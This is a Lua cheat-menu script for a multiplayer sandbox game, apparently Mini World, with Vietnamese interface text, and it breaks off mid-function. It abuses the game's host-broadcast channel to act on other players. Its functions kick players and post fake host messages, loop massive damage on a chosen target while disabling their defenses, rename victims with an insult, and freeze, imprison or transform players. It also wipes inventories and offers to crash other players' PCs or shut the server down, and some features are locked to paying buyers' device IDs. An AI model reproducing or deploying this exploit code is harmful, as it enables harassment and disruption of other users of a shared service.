_G.moRongPlayerLoop = false
_G.bienQuaiLoop = false

-- ============================================================
-- 1. ANTI MÀN HÌNH ĐEN (CHỌN NGƯỜI) - TOGGLE
-- ============================================================
function antiBlackScreenSelect()
    if _G.antiBlackScreenLoop then
        -- Nếu đang chạy -> TẮT
        _G.antiBlackScreenLoop = false
        ShowGameTipsWithoutFilter("#cFF0000🛑 Đã tắt Chống màn đen (chọn người)", 3)
        return
    end
    
    ShowPlayerList(function(targetUin)
        if whitelist and whitelist[targetUin] then
            ShowGameTipsWithoutFilter("#RKhông thể chống cho VIP!", 3)
            return
        end
        
        _G.antiBlackScreenLoop = true
        ShowGameTipsWithoutFilter("#c00ffff✅ Đã bật Chống màn đen cho " .. targetUin, 3)
        
        threadpool:work(function()
            local count = 0
            while _G.antiBlackScreenLoop do
                count = count + 1
                
                if _G.antiBlackScreenLoop then
                    if GameVM and GameVM.Player then
                        local oldGoToMainMenu = GameVM.Player.GoToMainMenu
                        GameVM.Player.GoToMainMenu = function() 
                            ShowGameTipsWithoutFilter("#cFF0000Đã chặn màn hình đen cho " .. targetUin, 3)
                        end
                    end
                end
                
                if count % 10 == 0 then
                    local tdata = {
                        [1] = "player",
                        [2] = "notifyGameInfo2Self",
                        [3] = {targetUin, ""}
                    }
                    pcall(function()
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                    end)
                end
                
                if count % 50 == 0 then
                    ShowGameTipsWithoutFilter("#cFFAA00Đang chống màn đen cho " .. targetUin .. " - " .. count .. " lần", 3)
                end
                
                threadpool:wait(0.1)
            end
            
            ShowGameTipsWithoutFilter("#cFF0000Đã tắt chống màn đen cho " .. targetUin .. ", tổng " .. count .. " lần", 3)
        end)
    end, "Chọn người chơi cần chống màn đen")
end

-- ============================================================
-- 2. ANTI MÀN HÌNH ĐEN (TOÀN PHÒNG) - TOGGLE
-- ============================================================
function antiBlackScreenAll()
    if _G.antiBlackScreenLoop then
        _G.antiBlackScreenLoop = false
        ShowGameTipsWithoutFilter("#cFF0000🛑 Đã tắt Chống màn đen (toàn phòng)", 3)
        return
    end
    
    _G.antiBlackScreenLoop = true
    ShowGameTipsWithoutFilter("#c00ffff✅ Đã bật Chống màn đen (toàn phòng)", 3)
    
    threadpool:work(function()
        local count = 0
        local myUin = AccountManager:getUin()
        
        while _G.antiBlackScreenLoop do
            count = count + 1
            
            if _G.antiBlackScreenLoop then
                if GameVM and GameVM.Player then
                    local oldGoToMainMenu = GameVM.Player.GoToMainMenu
                    GameVM.Player.GoToMainMenu = function() 
                        ShowGameTipsWithoutFilter("#cFF0000Đã chặn màn hình đen!", 3)
                    end
                end
            end
            
            if count % 20 == 0 then
                local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
                for i = 1, size do
                    local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
                    if targetPlayer then
                        local targetUin = targetPlayer:getUin()
                        if targetUin ~= myUin and not whitelist[targetUin] then
                            local tdata = {
                                [1] = "player",
                                [2] = "notifyGameInfo2Self",
                                [3] = {targetUin, ""}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                            end)
                        end
                    end
                end
                ShowGameTipsWithoutFilter("#cFFAA00Đã chống màn đen toàn phòng - " .. count .. " lần", 3)
            end
            
            threadpool:wait(0.1)
        end
        
        ShowGameTipsWithoutFilter("#cFF0000Đã tắt chống màn đen toàn phòng, tổng " .. count .. " lần", 3)
    end)
end

-- ============================================================
-- 3. ANTI TRỌNG LỰC - TOGGLE
-- ============================================================
function antiGravity()
    if _G.antiGravityLoop then
        _G.antiGravityLoop = false
        local tdata = {
            [1] = "gamerule",
            [2] = "setGravityFactor",
            [3] = {1.0}
        }
        pcall(function()
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end)
        ShowGameTipsWithoutFilter("#cFF0000🛑 Đã tắt Anti trọng lực", 3)
        return
    end
    
    _G.antiGravityLoop = true
    ShowGameTipsWithoutFilter("#c00ffff✅ Đã bật Anti trọng lực", 3)
    
    threadpool:work(function()
        local count = 0
        while _G.antiGravityLoop do
            count = count + 1
            local tdata = {
                [1] = "gamerule",
                [2] = "setGravityFactor",
                [3] = {1.0}
            }
            pcall(function()
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end)
            if count % 50 == 0 then
                ShowGameTipsWithoutFilter("#cFFAA00Đang duy trì trọng lực - " .. count .. " lần", 3)
            end
            threadpool:wait(0.1)
        end
        ShowGameTipsWithoutFilter("#cFF0000Đã tắt Anti trọng lực, tổng " .. count .. " lần", 3)
    end)
end

-- ============================================================
-- 4. ANTI CHỈNH KÍCH THƯỚC (TOÀN PHÒNG) - TOGGLE
-- ============================================================
function antiSize()
    if _G.antiSizeLoop then
        _G.antiSizeLoop = false
        ShowGameTipsWithoutFilter("#cFF0000🛑 Đã tắt Anti chỉnh kích thước", 3)
        return
    end
    
    _G.antiSizeLoop = true
    ShowGameTipsWithoutFilter("#c00ffff✅ Đã bật Anti chỉnh kích thước (toàn phòng)", 3)
    
    threadpool:work(function()
        local count = 0
        local myUin = AccountManager:getUin()
        
        while _G.antiSizeLoop do
            count = count + 1
            local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
            for i = 1, size do
                local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
                if targetPlayer then
                    local targetUin = targetPlayer:getUin()
                    if targetUin ~= myUin and not whitelist[targetUin] then
                        local tdata = {
                            [1] = "player",
                            [2] = "setAtt",
                            [3] = {targetUin, 1, 21}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                        end)
                    end
                end
            end
            if count % 20 == 0 then
                ShowGameTipsWithoutFilter("#cFFAA00Đang duy trì kích thước - " .. count .. " lần", 3)
            end
            threadpool:wait(0.2)
        end
        ShowGameTipsWithoutFilter("#cFF0000Đã tắt Anti chỉnh kích thước, tổng " .. count .. " lần", 3)
    end)
end

-- ============================================================
-- 5. ANTI MỞ RƯƠNG - TOGGLE
-- ============================================================
function antiMoRong()
    if _G.moRongPlayerLoop then
        _G.moRongPlayerLoop = false
        ShowGameTipsWithoutFilter("#cFF0000🛑 Đã tắt Anti mở rương", 3)
        return
    end
    
    ShowPlayerList(function(targetUin)
        if whitelist and whitelist[targetUin] then
            ShowGameTipsWithoutFilter("#RKhông thể chống cho VIP!", 3)
            return
        end
        
        _G.moRongPlayerLoop = true
        ShowGameTipsWithoutFilter("#c00ffff✅ Đã bật Anti mở rương cho " .. targetUin, 3)
        
        threadpool:work(function()
            local count = 0
            while _G.moRongPlayerLoop do
                count = count + 1
                
                -- Đóng rương liên tục
                local tdata = {
                    [1] = "player",
                    [2] = "closeBoxUI",
                    [3] = {targetUin}
                }
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                end)
                
                if count % 20 == 0 then
                    ShowGameTipsWithoutFilter("#cFFAA00Đang chống mở rương cho " .. targetUin .. " - " .. count .. " lần", 3)
                end
                
                threadpool:wait(0.05)
            end
            ShowGameTipsWithoutFilter("#cFF0000Đã tắt anti mở rương cho " .. targetUin .. ", tổng " .. count .. " lần", 3)
        end)
    end, "Chọn người chơi cần chống mở rương")
end

-- ============================================================
-- 6. ANTI BIẾN THÀNH QUÁI - TOGGLE
-- ============================================================
function antiBienQuai()
    if _G.bienQuaiLoop then
        _G.bienQuaiLoop = false
        ShowGameTipsWithoutFilter("#cFF0000🛑 Đã tắt Anti biến thành quái", 3)
        return
    end
    
    ShowPlayerList(function(targetUin)
        if whitelist and whitelist[targetUin] then
            ShowGameTipsWithoutFilter("#RKhông thể chống cho VIP!", 3)
            return
        end
        
        _G.bienQuaiLoop = true
        ShowGameTipsWithoutFilter("#c00ffff✅ Đã bật Anti biến quái cho " .. targetUin, 3)
        
        threadpool:work(function()
            local count = 0
            while _G.bienQuaiLoop do
                count = count + 1
                
                -- Duy trì model người chơi (role_1 là model mặc định)
                local tdata = {
                    [1] = "actor",
                    [2] = "changeCustomModel",
                    [3] = {targetUin, "role_1"}
                }
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                end)
                
                if count % 20 == 0 then
                    ShowGameTipsWithoutFilter("#cFFAA00Đang chống biến quái cho " .. targetUin .. " - " .. count .. " lần", 3)
                end
                
                threadpool:wait(0.2)
            end
            ShowGameTipsWithoutFilter("#cFF0000Đã tắt anti biến quái cho " .. targetUin .. ", tổng " .. count .. " lần", 3)
        end)
    end, "Chọn người chơi cần chống biến quái")
end
	
	
	-- ============================================================
-- THÊM VÀO ĐẦU MENU 112 (SAU PHẦN WHITELIST)
-- ============================================================

-- ===== ANTI DI CHUYỂN VARIABLES =====
_G.antiMoveLoop = false
_G.antiMoveSelfLoop = false

-- ============================================================
-- 1. ANTI CẤM DI CHUYỂN (BẢN THÂN) - TOGGLE
-- ============================================================
function antiMoveSelf()
    if _G.antiMoveSelfLoop then
        _G.antiMoveSelfLoop = false
        ShowGameTipsWithoutFilter("#cFF0000🛑 Đã tắt Anti cấm di chuyển (bản thân)", 3)
        return
    end
    
    _G.antiMoveSelfLoop = true
    ShowGameTipsWithoutFilter("#c00ffff✅ Đã bật Anti cấm di chuyển (bản thân)", 3)
    
    threadpool:work(function()
        local count = 0
        local myUin = AccountManager:getUin()
        
        while _G.antiMoveSelfLoop do
            count = count + 1
            
            -- Duy trì trạng thái có thể di chuyển
            local tdata = {
                [1] = "player",
                [2] = "setActionAttrState",
                [3] = {myUin, 1, true}
            }
            pcall(function()
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end)
            
            -- Cách 2: Dùng setAtt để reset
            if count % 5 == 0 then
                local tdata2 = {
                    [1] = "player",
                    [2] = "setAtt",
                    [3] = {myUin, 1, 21} -- Attribute 21 = kích thước, reset về 1
                }
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
                end)
            end
            
            if count % 50 == 0 then
                ShowGameTipsWithoutFilter("#cFFAA00Đang duy trì di chuyển cho bản thân - " .. count .. " lần", 3)
            end
            
            threadpool:wait(0.05)
        end
        
        ShowGameTipsWithoutFilter("#cFF0000Đã tắt Anti cấm di chuyển (bản thân), tổng " .. count .. " lần", 3)
    end)
end

-- ============================================================
-- 2. ANTI CẤM DI CHUYỂN (TOÀN PHÒNG) - TOGGLE
-- ============================================================
function antiMoveAll()
    if _G.antiMoveLoop then
        _G.antiMoveLoop = false
        ShowGameTipsWithoutFilter("#cFF0000🛑 Đã tắt Anti cấm di chuyển (toàn phòng)", 3)
        return
    end
    
    _G.antiMoveLoop = true
    ShowGameTipsWithoutFilter("#c00ffff✅ Đã bật Anti cấm di chuyển (toàn phòng)", 3)
    
    threadpool:work(function()
        local count = 0
        local myUin = AccountManager:getUin()
        
        while _G.antiMoveLoop do
            count = count + 1
            
            local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
            for i = 1, size do
                local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
                if targetPlayer then
                    local targetUin = targetPlayer:getUin()
                    if targetUin ~= myUin and not whitelist[targetUin] then
                        -- Duy trì trạng thái có thể di chuyển
                        local tdata = {
                            [1] = "player",
                            [2] = "setActionAttrState",
                            [3] = {targetUin, 1, true}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                        end)
                    end
                end
            end
            
            if count % 20 == 0 then
                ShowGameTipsWithoutFilter("#cFFAA00Đang duy trì di chuyển cho toàn phòng - " .. count .. " lần", 3)
            end
            
            threadpool:wait(0.05)
        end
        
        ShowGameTipsWithoutFilter("#cFF0000Đã tắt Anti cấm di chuyển (toàn phòng), tổng " .. count .. " lần", 3)
    end)
end



function mswsbmd()
	
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author4[currentDeviceID] then
        ShowGameTipsWithoutFilter("Nút này chỉ dành cho người mua", 3)
        return
    end
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 单体秒杀功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng hạ gục tức thì\nBên phải bật và chọn mục tiêu",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止秒杀 =====
            _G.dtms_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã dừng hạ gục tức thì")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启秒杀 =====
            _G.dtms_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                _G.dtms_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Phòng hiện tại không có người chơi khác")
                _G.dtms_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu hạ gục tức thì",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần hạ gục tức thì")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để bắt đầu hạ gục tức thì")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                

                
                -- ===== 添加禁止攻击状态 =====
                
                -- ============================
                
                ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi:" .. targetUin .. ", bắt đầu vòng lặp hạ gục tức thì (mục tiêu đã bị cấm tấn công)")
                
                -- 启动秒杀循环
                threadpool:work(function()
                    local myUin = AccountManager:getUin()
                    local loopCount = 0
                    
                    while _G.dtms_enabled do
                        loopCount = loopCount + 1
                        
                        -- 每10次重新施加禁止攻击（防止被清除）
                        if loopCount % 10 == 1 then
                            local keepDisable = {
                                [1] = "player",
                                [2] = "setActionAttrState",
                                [3] = {targetUin, 32, false}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, keepDisable)
                            end)
                        end
                        
                        local disableAttack = {
                    [1] = "player",
                    [2] = "forceOpenBoxUI",
                    [3] = {targetUin,797}  -- false = 禁止攻击
                }
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                   
                end)
                
                
                local disableAttack = {
                    [1] = "actor",
                    [2] = "setnickname",
                    [3] = {targetUin,'#RChó'}  -- false = 禁止攻击
                }
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                   
                end)
                
                local disableAttack = {
                    [1] = "actor",
                    [2] = "changeCustomModel",
                    [3] = {targetUin,[=[mob_3407]=]}  -- false = 禁止攻击
                }
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                   
                end)
                
                local disableAttack1 = {
                    [1] = "player",
                    [2] = "setActionAttrState",
                    [3] = {targetUin,32,false}  -- false = 禁止攻击
                }
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack1)
                   
                end)
                        
                        -- ===== 设置目标为可攻击状态 =====
                        local setAttackable = {
                            [1] = "player",
                            [2] = "setActionAttrState",
                            [3] = {targetUin, 64, true}
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setAttackable)
                        end)
                        -- ================================
                        
                        -- ===== 清除目标无敌buff =====
                        local clearBuff = {
                            [1] = "buff",
                            [2] = "clearAllBuff",
                            [3] = {targetUin}  -- 清除目标的所有buff
                        }
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, clearBuff)
                        end)
                        -- ===========================
                        
                        -- 播放特效
                        local t1 = {
                            [1] = "actor",
                            [2] = "playBodyEffectByFile",
                            [3] = {targetUin, "jiguang01", true}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t1) 
                        end)
                        
                        local t10 = {
                            [1] = "actor",
                            [2] = "playBodyEffectByFile",
                            [3] = {targetUin, "aotu_06_leishenzhichui", true}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t10) 
                        end)
                        

                        

                        
                        -- 设置属性（可选）
                        local t2 = {
                            [1] = "player",
                            [2] = "setAtt",
                            [3] = {targetUin, 1, 1}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t2) 
                        end)
                        local t3 = {
                            [1] = "player",
                            [2] = "setAtt",
                            [3] = {targetUin, 1, 2}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t3) 
                        end)
                        
                        -- 造成伤害
                        local t4 = {
                            [1] = "actor",
                            [2] = "playerHurt",
                            [3] = {myUin, targetUin, 1.8e+308, 0}
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t4) 
                        end)
                        
                        
                        
                        
                        -- 每10次显示一次提示
                        if loopCount % 10 == 0 then
                            ShowGameTipsWithoutFilter("#c00ffffĐã tấn công " .. loopCount .. " lần")
                        end
                        
                        threadpool:wait(0.000000000000000000000000000000000000000000000000000001)  -- 0.1秒攻击一次
                    end
                    
                    -- ===== 秒杀结束后恢复目标的攻击能力 =====
                    local enableAttack = {
                        [1] = "player",
                        [2] = "setActionAttrState",
                        [3] = {targetUin, 32, true}  -- true = 恢复攻击
                    }
                    pcall(function()
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, enableAttack)
                        ShowGameTipsWithoutFilter("#c00ff00Đã khôi phục khả năng tấn công của mục tiêu")
                    end)
                    -- ====================================
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp hạ gục tức thì kết thúc, tổng số lần tấn công " .. loopCount .. " lần")
                end)
            end
            -- ====================
        end
    end
)
end
	
--------------------------   
    
    
    
    
    
    
    
function AccChangeColorBtn_OnClick()
    ShowTextInputSafe(function(text)
        local target = tonumber(text)
        if not target or target <= 1000 then
            ShowGameTipsWithoutFilter("#cff0000Mini ID không hợp lệ (phải lớn hơn 1000)", 3)
            return
        end
        
        -- ===== LẤY TÊN NGƯỜI CHƠI =====
        local playerName = tostring(target) -- fallback là ID nếu không lấy được tên
        if ClientCurGame and ClientCurGame:isInGame() then
            local num = ClientCurGame:getNumPlayerBriefInfo() or 0
            for i = 1, num do
                local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                if briefInfo and briefInfo.uin == target and briefInfo.nickname then
                    playerName = briefInfo.nickname
                    break
                end
            end
        end
        -- =================================
        
        -- ===== KICK TRƯỚC =====
        AccountManager.cluster.buddysvr.routemore('gm.kick', target, 54188)
        -- ========================
        
        -- ===== GỬI TIN NHẮN CHAT SAU =====
        -- Thay %d (ID) thành %s (tên)
        local chatMessage = string.format(
            "#cfa7a0fChủ phòng đã mời #cE4A621%s#cfa7a0fra khỏi phòng",
            playerName
        )
        
        local tdata = {
            [1] = "chat",
            [2] = "sendChat",
            [3] = { chatMessage, 1, 0 }
        }
        pcall(function()
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end)
        -- ==================================
        
        ShowGameTipsWithoutFilter("Đã kick: " .. playerName .. " (" .. target .. ")", 3)
    end, "Nhập Mini ID")
end

    
    function TaskTrackFrame_OnClick()
    pcall(function() GetInst("MessageBoxInterface"):Close() end)
    _G.rotateLoop = false
    _G.rotateSpeedLoop = false
    _G.rotateBounceLoop = false
    _G.rotatePulseLoop = false
    _G.rotateReverseLoop = false
    _G.rotateLightningLoop = false
    _G.stairLoop = false
        local texta = { "Chức năng tùy chỉnh" }
        
local commonFuncs = {
    -- ==================== VÙNG 1: ANTI ====================
    {
        { "Anti cấm di chuyển (bản thân)", antiMoveSelf },
        { "Anti cấm di chuyển (toàn phòng)", antiMoveAll },
        { "Anti màn đen (chọn người)", antiBlackScreenSelect },
        { "Anti màn đen (toàn phòng)", antiBlackScreenAll },
        { "Anti trọng lực", antiGravity },
        { "Anti chỉnh kích thước", antiSize },
        { "Anti mở rương", antiMoRong },
        { "Anti biến thành quái", antiBienQuai },
        { "Anti sập", fzbk },
        { "Anti dịch chuyển", ycbr },
        { "Anti màn hình chết", pbsw },
        { "Vô hiệu hóa tấn công", wfgj },
        { "Anti tấn công", jzgj },
        { "Chống PC hạ gục tức thì", ExecuteAntiBotLogic },
        { "Làm treo PC", bdn },
    },
    
    -- ==================== VÙNG 2: ẢNH HƯỞNG NGƯỜI CHƠI ====================
    {
        { "bê all", xepBacThang },
        { "bê 1 người", xepBacThang1 },
        { "bậc thang", xepRuongBacThangFreeze },
        { "Vòng tròn xoay theo chủ nhân", circleFormationRotateFollow },
        { "Vòng tròn xoay theo chủ nhân 1 người", circleFormationRotateFollow1 },
        { "Thay đổi máu người chơi", wjsm },
        { "Thay đổi sát thương người chơi", wjgjl },
        { "Thay đổi kích thước người chơi", wjdx },
        { "Đặt người chơi thua", wjsb },
        { "Rung màn hình chỉ định", ddjt },
        { "Hiệu ứng người chơi", wjtx },
        { "Giết người chơi", jbwj },
        { "Cấm di chuyển", jzyd },
        { "Tắt quyền", gbqx },
        { "Xoay người chơi", wjxz },
        { "Giam cầm người chơi", tjbf },
        { "Xóa người chơi", qcwj },
        { "Cảnh cáo người chơi", jgwj },
        { "Buff tùy chỉnh", zdbf },
        { "Nâng người chơi chỉ định", zdjr },
        { "Điều khiển di chuyển", kzyd },
        { "Người chơi tự sát", wjzc },
        { "Cấm lời người chơi", jywj },
        { "Cưỡi người chơi", qxwj },
        { "Kết bạn cưỡng chế", zdhy },
        { "Chỉ định quan sát", zdgz },
        { "Tặng skin người chơi", gypf },
        { "Chuyển đội", qhdw },
        { "Vẽ đường cho người chơi", hzwj },
        { "Xóa túi đồ người chơi", qkwjbb },
        { "Bắt người chơi nằm xuống", zdzl },
        { "Ném xuống hư không", qtxk },
        { "Kéo người chơi đến", qtxr },
        { "Tiêu diệt đơn thể", dtms },
        { "Hồi sinh hư không", fhxk },
        { "Chỉ định truyền tải", zdcsrl },
    },
    
    -- ==================== VÙNG 3: BẢN THÂN ====================
    {
        { "Thay đổi máu nhân vật", rwgx },
        { "Tùy chỉnh kích thước", zddx },
        { "Tùy chỉnh skin", zdpf },
        { "Đổi tên màu", xgcm },
        { "Tùy chỉnh avatar", zdtx },
        { "72 phép biến hóa", qseb },
        { "Di chuyển tức thời", sjyd },
        { "Màu chữ gradient", csfy },
        { "Mở quyền", kqqx },
        { "Vô hiệu hóa cấm chat", wsjy },
        { "Động tác chờ", djdz },
        { "Tăng tốc nhân vật", rwjs },
        { "Triệu hồi thú cưng", zhcw },
        { "Triệu hồi vật cưỡi", zhzq },
        { "Skin vũ khí", wqpf },
        { "Đội vương miện", tdwg },
        { "Xóa buff", qcbf },
        { "Chế độ trước trận", jqms },
        { "Chế độ chỉnh sửa miễn phí", mczbj },
        { "Mở khóa vật cưỡi nhanh", kjzq },
        { "Mở khóa toàn bộ skin", hdqp },
        { "Hiệu ứng đặc biệt", zstx },
        { "Tạo trứng bom", czbbd },
        { "Tạo chất nổ", czzy },
        { "Phá hủy khối theo ngắm", zxph },
        { "Điều khiển ngắm", zxkz },
        { "Hiệu ứng theo ngắm", zxsw },
        { "Chuyển vùng Nhật Bản", qhrb },
    },
    
    -- ==================== VÙNG 4: TOÀN PHÒNG ====================
    {
        { "Cấm tham gia giữa chừng", jzjr },
        { "Kick Tất Cả", kickAllPlayers },
        { "Set Vương Miệng All", setCrownAndTextAll },
        { "Set Dame ALL", setDamageAll },
        { "Give HH ALL", getAchievementAll },
        { "mở khóa skin toàn phòng (lag điên)", unlockAllSkins },
        { "Biến Tất Cả Player Thành quái", makeAllBoss },
        { "Hút Player Thành Vòng Tròn", circleFormation },
        { "Mô phỏng phá hình", ztmn },
        { "Pháp thuật phát xá", dffz },
        { "Set tên toàn phòng (CE)", didyskibi },
        { "ném tất cả lên trời", throwAllUp },
        { "set hp 1 lần", setAllHP },
        { "set hp loop", setAllHPLoop },
        { "give skin cho player", give1kSkin },
        { "give chữ", giveTextTarget },
        { "chữ trên đầu all", giveTextAll },
        { "xóa chữ trên đầu all", clearTextAll },
        { "Thay đổi bầu trời", gbtk },
        { "Dừng tất cả vòng tròn xoay", stopAllRotate },
        { "Danh sách đen phòng", fjhmd },
    },
    
    -- ==================== VÙNG 5: PHÁT NHẠC ====================
    {
        { "Cảm ơn bạn đã từng đến", bf1 },
        { "Giới thiệu bản thân", bf2 },
        { "Tôi hướng về trăng sáng", bf3 },
        { "Hành khúc cách mạng", bf4 },
        { "Vẫn sẽ nhớ em", bf5 },
        { "La Sinh Môn", bf6 },
        { "Dành cho em", bf7 },
        { "Đạo sĩ Lao Sơn", bf8 },
        { "Càng hiểu càng không hiểu", bf9 },
        { "Bài hát loa kép", bf10 },
    },
    
    -- ==================== VÙNG 6: ẢNH HƯỞNG THẾ GIỚI ====================
    {
        { "Thời tiết (nắng)", gbtq1 },
        { "Thời tiết (mưa)", gbtq2 },
        { "Thời tiết (tuyết)", gbtq3 },
        { "Thời tiết (cát)", gbtq4 },
        { "Trọng lực bản đồ", dtzl },
        { "Tăng tốc thời gian", sjls },
        { "Khóa thời gian", sdsj },
        { "Xóa vật phẩm rơi", qcwp },
        { "Xóa vật phẩm rơi liên tục", qcwp2 },
        { "Đóng máy chủ", yfgb },
        { "Khu vực chiến đấu đơn", dtly },
        { "Tạo nhà tù", czjy },
        { "Tạo biển hoa", czhh },
        { "Phá hủy khối lớn", phfk },
        { "Đặt khối dưới chân", jxfk },
        { "Phóng tia laser", fsjg },
        { "Thiên lôi giáng thế", tjsw },
        { "Phát hiệu ứng âm thanh", bfyx },
        { "Tạo sinh vật tùy chỉnh", zdsw },
        { "Triệu hồi Boss", czgw },
        { "Tăng cường sinh vật ngắm", jqsw },
    },
    
    -- ==================== VÙNG 7: CODE HÌNH HỌC ====================
    {
        { "Vòng tròn xoay", circleFormationRotate },
        { "Vòng tròn xoay 2 tốc độ", circleFormationSpeed },
        { "Vòng tròn xoay + bật nhảy", circleFormationBounce },
        { "Vòng tròn phồng/xẹp", circleFormationPulse },
        { "Vòng tròn xoay ngược chiều", circleFormationReverse },
        { "Vòng tròn xoay + sét", circleFormationLightning },
        { "Dừng vòng tròn xoay", stopRotate },
        { "Vòng tròn xoay theo chủ nhân", circleFormationRotateFollow },
        { "Hút Player Thành Vòng Tròn", circleFormation },
    },
}
        


local a = GetClientInfo():getDeviceID()
-- 将当前设备码作为键放入设备函数表
local accountFunctions = {
    [a] = commonFuncs
}

        
        local function getDeviceID()
            local clientInfo = GetClientInfo()
            if not clientInfo then
                MessageBox(4, "Không thể lấy thông tin máy khách")
                return nil
            end
            local deviceID = clientInfo:getDeviceID()
            if deviceID then deviceID = deviceID:gsub("^%s+", ""):gsub("%s+$", "") end
            return (deviceID and deviceID ~= "") and deviceID or nil
        end
        
        local function getAuthorizedFunctions()
            local deviceID = getDeviceID()
            if not deviceID then
                MessageBox(4, "Không thể lấy mã thiết bị")
                return nil
            end
            
            local funcList = accountFunctions[deviceID]
            if not funcList then
                MessageBox(4, "Thiết bị này chưa được cấp quyền")
                return nil
            end
            return funcList
        end
        
        local authorizedFuncs = getAuthorizedFunctions()
        if authorizedFuncs then Functions(texta, authorizedFuncs) end
    end
end



-- ==================== os_load函数 ====================
function os_load(ft, msgis, msgno)
    if gFunc_isStdioFileExist(filepath_root .. 'axdx/' .. ft .. '/1') then
        load_msg(msgis)
        gFunc_deleteFileByFullPath(filepath_root .. 'axdx/' .. ft .. '/1')
        gFunc_deleteFileByFullPath(filepath_root .. 'axdx/' .. ft .. '/3')
    elseif gFunc_isStdioFileExist(filepath_root .. 'axdx/' .. ft .. '/0') then
        load_msg(msgno)
        gFunc_deleteFileByFullPath(filepath_root .. 'axdx/' .. ft .. '/0')
        gFunc_deleteFileByFullPath(filepath_root .. 'axdx/' .. ft .. '/3')
    end
end
function circleFormation()
    local myUin = AccountManager:getUin()
    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local cx, cy, cz = x / 100, y / 100, z / 100
    local radius = 8
    local count = 0
    
    for i = 1, size do
        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
        if targetPlayer then
            local targetUin = targetPlayer:getUin()
            if targetUin ~= myUin then
                local angle = (count / (size - 1)) * 2 * math.pi
                local px = cx + radius * math.cos(angle)
